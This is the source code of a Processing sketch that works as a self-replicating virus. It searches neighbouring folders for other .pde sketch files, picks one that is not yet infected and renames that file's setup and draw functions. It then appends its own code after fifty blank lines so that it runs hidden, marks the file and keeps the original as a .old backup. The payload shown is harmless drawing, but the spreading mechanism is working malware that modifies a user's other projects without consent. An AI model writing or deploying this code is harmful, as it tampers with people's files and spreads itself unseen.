/*@@@*/

/* just prevent java from complaining */
void _setup() {}
void _draw() {}

/*INFECTIOUS*/
void __getPDEPaths(ArrayList<File> a, String dir) {
  File file = new File(dir);
  if (file.isDirectory()) {
    if (file.getAbsolutePath().equals(sketchPath("")))
      return;
    File[] subfiles = file.listFiles();
    for (int i = 0; i < subfiles.length; i++) {
      __getPDEPaths(a, subfiles[i].getAbsolutePath());
    }
  } else {
    if (file.getName().contains(".pde") && !file.getName().contains(".old")) {
      a.add(file);
    }
  }
}

File __getTheRandomChosenOne(ArrayList<File> a) {
  boolean foundTheChosenOne = false;
  
  while (a.size() > 0) {
    int idx = int(random(a.size()));
    File f = a.get(idx);
    
    try {
      BufferedReader reader = createReader(f.getAbsolutePath());
      String line = reader.readLine();
      if (!line.equals("/*@@@*/")) {
        foundTheChosenOne = true;
      } else {
        a.remove(idx);
      }
      reader.close();
    } catch (IOException e) {
      println("Exception: " + e);
      a.remove(idx);
    }
    
    if (foundTheChosenOne)
      return f;
  }
  
  return null;
}

import java.util.Arrays;

void __infect(File f) {
  ArrayList<String> lines = new ArrayList<String>(Arrays.asList(loadStrings(f.getAbsolutePath())));
  boolean setupReplaced = false;
  boolean drawReplaced = false;
  
  for (int i=0; i<lines.size(); i++) {
    String l = lines.get(i);
    
    if (l.matches("^\\s*void\\s*setup\\s*(\\s*).*$")) {
      lines.set(i, l.replace("setup", "_setup"));
      setupReplaced = true;
      continue;
    }
    
    if (l.matches("^\\s*void\\s*draw\\s*(\\s*).*$")) {
      lines.set(i, l.replace("draw", "_draw"));
      drawReplaced = true;
      continue;
    }
    
    if (setupReplaced && drawReplaced) {
      break;
    }
  }
  
  /* setup and draw are renamed, we can now append ourselve */
  if (setupReplaced && drawReplaced) {
    String pathToSelf = new File(sketchPath("")).getName() + ".pde";
    String[] code = loadStrings(pathToSelf);
    boolean foundMarker = false;
    String payload = "";
    
    for (int i=0; i<code.length; i++) {
      if (foundMarker) {
        /* do not write comments */
        if (! code[i].matches("^\\s*/+.*")) {
          payload += code[i].trim();
        }
      } else if (code[i].equals("/*INFECTIOUS*/")) {
        for (int j=0; j<50; j++) {
          payload += "\n";
        }
        payload += ("/*INFECTIOUS*/\n");
        foundMarker = true;
      } 
    }
    lines.add(payload);
    lines.add(0, "/*@@@*/");
    
    try {
      String destPath = f.getAbsolutePath() + ".old";
      File dest = new File(destPath);
      if (f.renameTo(dest)) {
        String[] virusCode = new String[lines.size()];
        virusCode = lines.toArray(virusCode);
        saveStrings(f.getAbsolutePath(), virusCode);
      } else {
        println("failed to rename to " + destPath);
      }
    } catch (SecurityException e) {
      println(e);  
    }
  }
}

void setup() {
  ArrayList<File> allFiles = new ArrayList<File>();  
  String path = new File(sketchPath("")).getParent();
  __getPDEPaths(allFiles, path);
  File f = __getTheRandomChosenOne(allFiles);

  if (f != null) {
    println("chose: "+ f.getAbsolutePath());
    __infect(f);    
  } else {
    println("No candidate found");
  }
  
  _setup();
}

void draw() {
  _draw();
  __payload();
}

void __payload() {
  fill(color(255, 0, 0));
  rect(100, 100, mouseX, mouseY);  
}
